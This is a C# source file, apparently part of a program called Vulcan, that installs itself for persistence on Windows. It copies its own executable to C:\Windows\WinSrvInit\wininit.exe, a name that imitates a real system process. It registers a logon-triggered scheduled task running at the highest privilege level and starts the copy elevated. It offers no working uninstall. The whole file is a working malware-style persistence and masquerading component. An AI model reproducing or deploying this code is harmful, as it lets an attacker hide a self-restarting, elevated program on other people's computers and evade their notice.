using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32.TaskScheduler;

namespace Vulcan.Core.Installer
{
    public class InstallerPrivileged : IVulcanInstaller
    {
        static InstallerPrivileged()
        {
            if (!File.Exists("Microsoft.Win32.TaskScheduler.dll"))
            {
                File.WriteAllBytes("Microsoft.Win32.TaskScheduler.dll", Properties.Resources.TskSched);
                FileHelper.Touch("Microsoft.Win32.TaskScheduler.dll");
            }
        }

        public bool IsInstalled()
        {
            return File.Exists(@"C:\Windows\WinSrvInit\wininit.exe");
        }

        public bool ShouldInstall(VulcanConfiguration config)
        {
            return config.RunLevel == VulcanRunLevel.System;
        }

        public void Install()
        {
            FileHelper.CreateDirectory(@"C:\Windows\WinSrvInit");
            string dst = @"C:\Windows\WinSrvInit\wininit.exe";
            FileHelper.DropCopy(dst);
            using (TaskService ts = new TaskService())
            {
                ts.GetRunningTasks();
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "Vulcan Task";
                td.Triggers.Add(new LogonTrigger());
                td.Principal.RunLevel = TaskRunLevel.Highest;
                td.Actions.Add(new ExecAction(dst, "noinstall", null));
                ts.RootFolder.RegisterTaskDefinition("VLCNSRVTask", td);
            }

            ProcessStartInfo vulcan = new ProcessStartInfo(@"C:\Windows\WinSrvInit\wininit.exe", "noinstall");
            vulcan.Verb = "runas";
            vulcan.UseShellExecute = false;
            Process.Start(vulcan);
        }

        public void Uninstall()
        {

        }
    }
}
